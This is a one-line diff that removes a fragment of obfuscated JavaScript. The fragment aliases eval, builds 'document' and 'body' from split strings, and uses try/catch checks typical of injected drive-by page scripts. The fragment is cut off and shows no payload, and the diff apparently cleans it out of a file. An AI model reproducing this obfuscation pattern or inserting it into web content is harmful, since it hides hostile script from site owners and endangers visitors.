@@ -1,1 +1,0 @@
-"split";e=eval;v="0x";a=0;z="y";try{a*=25}catch(zz){a=1}if(!a){try{--e("doc"+"ument")["bod"+z]}catch(q){}
